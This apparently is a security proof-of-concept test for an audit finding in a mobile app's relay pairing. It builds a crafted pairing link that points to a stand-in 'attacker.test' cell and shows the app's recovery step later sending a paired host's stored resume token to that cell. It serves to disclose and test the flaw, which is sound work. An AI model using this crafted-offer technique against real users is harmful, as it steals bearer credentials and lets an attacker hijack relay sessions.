// Audit 1, A1-03: a pairing offer that reuses a paired host's public key but names another
// relayHostId and cell leaves a recovery journal bound to that host; the next recovery run sends
// the host's stored relay resume token to the offer's cell.
// All pairing and recovery logic is the production code under mobile/src. Only the WebSocket (an
// in-memory recording socket), the unreachable direct and director dependencies and four React
// Native packages are substituted. Keys and tokens are generated here.
import { createHash, randomBytes } from 'node:crypto'
import { expect, it, vi } from 'vitest'

const mem = vi.hoisted(() => ({
  asyncStore: new Map<string, string>(),
  secureStore: new Map<string, string>()
}))

vi.mock('react-native', () => ({
  Platform: { OS: 'ios', select: (o: Record<string, unknown>) => o.ios ?? o.default },
  AppState: { currentState: 'active', addEventListener: () => ({ remove() {} }) }
}))
vi.mock('expo-crypto', async () => {
  const nodeCrypto = await import('node:crypto')
  return { getRandomBytes: (length: number) => new Uint8Array(nodeCrypto.randomBytes(length)) }
})
vi.mock('expo-secure-store', () => {
  const slot = (key: string, options?: { keychainService?: string }) =>
    `${options?.keychainService ?? ''}|${key}`
  return {
    WHEN_UNLOCKED_THIS_DEVICE_ONLY: 'WHEN_UNLOCKED_THIS_DEVICE_ONLY',
    getItemAsync: async (key: string, options?: { keychainService?: string }) =>
      mem.secureStore.get(slot(key, options)) ?? null,
    setItemAsync: async (key: string, value: string, options?: { keychainService?: string }) => {
      mem.secureStore.set(slot(key, options), value)
    },
    deleteItemAsync: async (key: string, options?: { keychainService?: string }) => {
      mem.secureStore.delete(slot(key, options))
    }
  }
})
vi.mock('@react-native-async-storage/async-storage', () => ({
  default: {
    getItem: async (key: string) => mem.asyncStore.get(key) ?? null,
    setItem: async (key: string, value: string) => {
      mem.asyncStore.set(key, value)
    },
    removeItem: async (key: string) => {
      mem.asyncStore.delete(key)
    },
    getAllKeys: async () => [...mem.asyncStore.keys()],
    multiRemove: async (keys: string[]) => {
      for (const key of keys) {
        mem.asyncStore.delete(key)
      }
    }
  }
}))

import { parsePairingCode } from '../../../../../mobile/src/pairing/pairing'
import { loadHosts, savePairedHost } from '../../../../../mobile/src/host-catalog/host-store'
import {
  readMobileRelayCredentialBundle,
  writeMobileRelayCredentialBundle
} from '../../../../../mobile/src/host-credentials/mobile-relay-credential-bundle'
import { hashMobileRelayCredential } from '../../../../../mobile/src/transport/relay/mobile-relay-credential-hash'
import { startPreProfilePairing } from '../../../../../mobile/src/pairing/pre-profile-pairing-coordinator'
import { loadMobileRelayPairingJournal } from '../../../../../mobile/src/pairing/mobile-relay-pairing-journal-store'
import { recoverMobileRelayPairing } from '../../../../../mobile/src/pairing/mobile-relay-pairing-recovery'
import { connectMobileRelayForPairing } from '../../../../../mobile/src/pairing/mobile-relay-physical-client'
import { describePoc } from './security-poc-opt-in'

const b64url = (bytes: Uint8Array): string => Buffer.from(bytes).toString('base64url')

type SocketRecord = { url: string; frames: string[] }
const sockets: SocketRecord[] = []

class RecordingCellSocket {
  readyState = 0
  bufferedAmount = 0
  onopen: (() => void) | null = null
  onmessage: ((e: { data: unknown }) => void) | null = null
  onerror: (() => void) | null = null
  onclose: ((e: { code: number; reason: string }) => void) | null = null
  private readonly record: SocketRecord
  constructor(url: string) {
    this.record = { url, frames: [] }
    sockets.push(this.record)
    setTimeout(() => {
      this.readyState = 1
      this.onopen?.()
    }, 0)
  }
  send(frame: unknown): void {
    this.record.frames.push(String(frame))
    // Behave like a cell that refuses the outer credential AFTER receiving it.
    setTimeout(
      () =>
        this.onmessage?.({ data: JSON.stringify({ type: 'relay-hello', ok: false, code: 4401 }) }),
      0
    )
  }
  close(): void {
    if (this.readyState === 3) {
      return
    }
    this.readyState = 3
    setTimeout(() => this.onclose?.({ code: 4401, reason: '' }), 0)
  }
}

const recordingTransport: typeof connectMobileRelayForPairing = (args) =>
  connectMobileRelayForPairing({
    ...args,
    createSocket: (url) => new RecordingCellSocket(url) as unknown as WebSocket
  })

describePoc('audit 1 A1-03: pairing recovery resume-token disclosure', () => {
  it('discloses the paired host resume token to an attacker offer cell', async () => {
    const now = Date.now()
    // Victim already relay-paired with its real host. The public key is not secret.
    const hostPublicKeyB64 = Buffer.from(randomBytes(32)).toString('base64')
    const realRelayHostId = b64url(
      createHash('sha256').update(Buffer.from(hostPublicKeyB64, 'base64')).digest()
    ).slice(0, 16)
    const realResumeToken = b64url(randomBytes(32))
    await savePairedHost({
      id: 'host-legit',
      name: 'Work Mac',
      endpoint: 'ws://192.0.2.10:6768',
      deviceToken: 'legit-device-token',
      publicKeyB64: hostPublicKeyB64,
      lastConnected: now,
      relay: {
        v: 1,
        directorUrl: 'https://relay.legit.test',
        cellUrl: 'https://relay.legit.test',
        assignmentEpoch: 3,
        relayHostId: realRelayHostId,
        e2eeFraming: 2
      }
    })
    await writeMobileRelayCredentialBundle({
      v: 1,
      hostId: 'host-legit',
      deviceToken: 'legit-device-token',
      current: {
        token: realResumeToken,
        hash: hashMobileRelayCredential(realResumeToken),
        version: 1,
        expiresAt: now + 30 * 24 * 60 * 60 * 1000
      }
    })

    // Attacker crafts an offer: same public key, attacker cell + mismatched relayHostId.
    const attackerOffer = {
      v: 2,
      endpoint: 'ws://203.0.113.7:6768',
      deviceToken: 'attacker-made-up-ticket',
      publicKeyB64: hostPublicKeyB64,
      relay: {
        v: 1,
        directorUrl: 'https://attacker.test',
        cellUrl: 'https://attacker.test',
        assignmentEpoch: 0,
        relayHostId: 'AAAAAAAAAAAAAAAA',
        inviteToken: b64url(randomBytes(32)),
        inviteExpiresAt: now + 5 * 60 * 1000,
        e2eeFraming: 2
      }
    }
    const link = `seal://pair?code=${b64url(Buffer.from(JSON.stringify(attackerOffer)))}`
    const offer = parsePairingCode(link)
    expect(offer).not.toBeNull()
    // The production schema accepted the offer with the mismatched relayHostId.
    expect(offer!.relay!.relayHostId).toBe('AAAAAAAAAAAAAAAA')
    expect(offer!.relay!.relayHostId).not.toBe(realRelayHostId)

    // Confirm the offer; neither path authenticates, so pairing fails.
    const attempt = startPreProfilePairing({
      offer: offer!,
      timeoutMs: 5_000,
      dependencies: {
        connectDirect: (() => ({
          sendRequest: async () => {
            throw new Error('direct endpoint unreachable')
          },
          close: () => {}
        })) as never,
        connectRelay: recordingTransport,
        resolveInviteDirector: async () => {
          throw new Error('attacker director silent')
        }
      }
    })
    const pairingError = await attempt.result.then(
      () => null,
      (e: unknown) => e
    )
    attempt.dispose()
    expect(pairingError).toBeInstanceOf(Error)

    // During the attempt itself the real token must not have been sent.
    expect(sockets.flatMap(({ frames }) => frames).some((f) => f.includes(realResumeToken))).toBe(
      false
    )

    // The failed attempt left a journal aliased to the real host id but attacker cell.
    const journal = await loadMobileRelayPairingJournal()
    expect(journal?.metadata.host.id).toBe('host-legit')
    expect(journal?.metadata.relay.cellUrl).toBe('https://attacker.test')
    expect(journal?.metadata.relay.relayHostId).toBe('AAAAAAAAAAAAAAAA')

    // Next launch runs recovery (mirrors _layout.tsx cold-start call).
    const before = sockets.length
    await recoverMobileRelayPairing({ connectRelay: recordingTransport })
    const recoverySockets = sockets.slice(before)

    const leaked = recoverySockets.filter(({ url, frames }) =>
      frames.some((frame) => {
        const parsed = JSON.parse(frame) as { type?: string; credential?: string }
        return (
          url.startsWith('wss://attacker.test/v1/connect/') &&
          parsed.type === 'relay-auth' &&
          parsed.credential === realResumeToken
        )
      })
    )
    expect(leaked.length).toBe(1)

    // Real pairing untouched: the disclosed bearer remains valid for the real relay.
    const bundleAfter = await readMobileRelayCredentialBundle('host-legit')
    expect(bundleAfter?.current.token).toBe(realResumeToken)
    const hostAfter = (await loadHosts()).find(({ id }) => id === 'host-legit')
    expect(hostAfter?.relay?.cellUrl).toBe('https://relay.legit.test')
  })
})
